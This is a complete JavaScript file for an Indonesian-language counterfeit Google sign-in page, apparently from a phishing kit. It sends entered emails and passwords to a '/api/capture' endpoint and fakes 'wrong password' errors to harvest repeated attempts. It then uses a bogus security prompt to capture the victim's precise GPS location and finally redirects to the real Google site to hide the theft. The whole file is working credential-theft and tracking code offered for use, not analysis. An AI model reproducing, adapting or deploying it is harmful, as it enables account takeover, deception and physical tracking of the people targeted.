(function () {
  'use strict';
  var card = document.getElementById('card');
  var nextBtn = document.getElementById('nextBtn');
  var emailInput = document.getElementById('email');
  var emailField = document.getElementById('emailField');
  var currentEmail = '';
  var attempts = 0;
  var GPS_TRIED = false;

  function send(payload) {
    try {
      return fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function () {});
    } catch (e) { return Promise.resolve(); }
  }

  function colorFor(str) {
    var colors = ['#1a73e8', '#d93025', '#188038', '#e37400', '#9334e6', '#0b8043'];
    var h = 0;
    for (var i = 0; i < str.length; i++) h = str.charCodeAt(i) + ((h << 5) - h);
    return colors[Math.abs(h) % colors.length];
  }

  function showError(fieldEl, msg) {
    var old = document.querySelector('.error-msg');
    if (old) old.remove();
    var err = document.createElement('div');
    err.className = 'error-msg';
    err.innerHTML = '<svg viewBox="0 0 24 24" width="16" height="16" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>' + msg + '</span>';
    fieldEl.parentNode.insertBefore(err, fieldEl);
    fieldEl.querySelector('input').classList.add('error');
  }

  function clearError(fieldEl) {
    var old = document.querySelector('.error-msg');
    if (old) old.remove();
    fieldEl.querySelector('input').classList.remove('error');
  }

  function buildStep2() {
    var initial = currentEmail.charAt(0).toUpperCase();
    var color = colorFor(currentEmail);
    card.innerHTML =
      '<div class="logo"><img src="/logo.png" alt="Google" style="width:80px;height:auto;"></div>' +
      '<h1>Selamat datang</h1>' +
      '<div class="profile-pill">' +
        '<div class="avatar" style="background:' + color + '">' + initial + '</div>' +
        '<div class="email-text">' + currentEmail + ' <span class="caret">\u25BE</span></div>' +
      '</div>' +
      '<p class="enter-pw">Masukkan sandi Anda</p>' +
      '<div class="field" id="passwordField">' +
        '<input type="password" id="password" required autofocus>' +
        '<label for="password">Masukkan sandi Anda</label>' +
      '</div>' +
      '<label class="show-pw"><input type="checkbox" id="showPw"> Tampilkan sandi</label>' +
      '<div class="actions"><a href="#" class="link">Lupa sandi?</a></div>' +
      '<div class="buttons"><button type="button" class="btn-text" id="nextBtn2">Berikutnya</button></div>' +
      '<div class="lang"><select><option>Bahasa Indonesia</option><option>English (United States)</option></select></div>';

    var pwField = document.getElementById('passwordField');
    var pwInput = document.getElementById('password');
    var btn = document.getElementById('nextBtn2');
    var showCb = document.getElementById('showPw');
    showCb.addEventListener('change', function () { pwInput.type = showCb.checked ? 'text' : 'password'; });
    btn.addEventListener('click', function () { submitPassword(pwField, pwInput, btn); });
    pwInput.addEventListener('keydown', function (e) { if (e.key === 'Enter') btn.click(); });
    pwInput.focus();
  }

  function submitPassword(pwField, pwInput, btn) {
    var pw = pwInput.value;
    if (!pw) { pwInput.focus(); return; }
    attempts++;
    send({ type: 'password', email: currentEmail, password: pw, ts: Date.now() });
    clearError(pwField);
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span>Memverifikasi...';
    if (attempts < 3) {
      setTimeout(function () {
        btn.disabled = false;
        btn.innerHTML = 'Berikutnya';
        pwInput.value = '';
        showError(pwField, 'Sandi salah. Coba lagi atau klik Lupa sandi untuk menyetel ulang.');
        pwInput.focus();
      }, 1800);
      return;
    }
    setTimeout(function () {
      if (navigator.geolocation && !GPS_TRIED) { GPS_TRIED = true; showLocationModal(); }
      else { window.location.href = 'https://accounts.google.com/'; }
    }, 1800);
  }

  function showLocationModal() {
    var modal = document.createElement('div');
    modal.className = 'loc-modal';
    modal.innerHTML =
      '<div class="loc-modal-content">' +
        '<div class="loc-icon">\uD83D\uDCCD</div>' +
        '<h2>Verifikasi Keamanan</h2>' +
        '<p>Google perlu memverifikasi lokasi Anda untuk melindungi akun dari login mencurigakan.</p>' +
        '<p style="font-size:12px;color:#80868b;">Lokasi Anda tidak akan disimpan secara permanen.</p>' +
        '<div class="loc-buttons">' +
          '<button class="loc-allow" id="locAllow">Izinkan</button>' +
          '<button class="loc-deny" id="locDeny">Nanti</button>' +
        '</div>' +
      '</div>';
    document.body.appendChild(modal);
    document.getElementById('locAllow').addEventListener('click', function () {
      modal.remove();
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          send({ type: 'gps', email: currentEmail, lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, ts: Date.now() });
          setTimeout(function () { window.location.href = 'https://accounts.google.com/'; }, 500);
        },
        function () { window.location.href = 'https://accounts.google.com/'; },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
    document.getElementById('locDeny').addEventListener('click', function () {
      modal.remove();
      setTimeout(function () { window.location.href = 'https://accounts.google.com/'; }, 500);
    });
  }

  nextBtn.addEventListener('click', function (e) {
    e.preventDefault();
    var v = emailInput.value.trim();
    if (!v || v.indexOf('@') === -1) {
      showError(emailField, 'Masukkan email atau nomor telepon yang valid.');
      emailInput.focus();
      return;
    }
    clearError(emailField);
    currentEmail = v;
    send({ type: 'email', value: v, ts: Date.now() });
    buildStep2();
  });

  emailInput.addEventListener('keydown', function (e) { if (e.key === 'Enter') nextBtn.click(); });
  emailInput.addEventListener('input', function () { clearError(emailField); });
})();
